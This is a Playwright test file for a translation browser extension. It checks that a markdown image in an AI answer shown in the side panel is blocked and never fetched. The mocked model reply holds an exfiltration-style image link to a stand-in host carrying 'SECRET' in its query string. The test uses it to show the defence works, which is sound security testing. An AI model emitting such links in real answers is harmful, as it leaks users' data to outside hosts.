import { test, expect } from '@playwright/test';
import { launchExtension, mockAnthropic, seedSettings, type ExtensionHandle } from './helpers';

// An answer is attacker-influenceable; an image in it must not reach the network. jsdom never loads images, so this runs in Chromium.
let ext: ExtensionHandle;

test.beforeEach(async () => {
  ext = await launchExtension();
  await seedSettings(ext.context, ext.extensionId, {
    anthropicApiKey: 'test-key',
    streaming: true,
  });
});

test.afterEach(async () => {
  await ext.close();
});

test('an image in a side-panel answer never fetches', async () => {
  const beacons: string[] = [];
  await ext.context.route('https://exfil.test/**', async (route) => {
    beacons.push(route.request().url());
    await route.fulfill({ status: 204, body: '' });
  });
  mockAnthropic(ext.context, {
    translation: 'Hello ![logo](https://exfil.test/leak?d=SECRET) friend',
    confidence: 0.9,
    times: 1,
  });

  const sp = await ext.context.newPage();
  await sp.goto(`chrome-extension://${ext.extensionId}/src/sidepanel/index.html`);
  await sp.locator('#sp-text').fill('marhaba');
  await sp.getByRole('button', { name: /^Translate$/ }).click();
  const body = sp.locator('.ega-assistant-body').filter({ hasText: 'friend' }).first();
  await body.waitFor({ state: 'visible', timeout: 20_000 });
  await expect(body.locator('.ega-md-img-blocked')).toHaveText('logo');
  await expect(body.locator('img')).toHaveCount(0);

  // Route events arrive in request order, so once this later request is seen an earlier leak would be too.
  const control = 'https://exfil.test/control';
  await sp.evaluate((url) => {
    new Image().src = url;
  }, control);
  await expect.poll(() => beacons, { timeout: 5_000 }).toContain(control);
  expect(beacons).toEqual([control]);
});
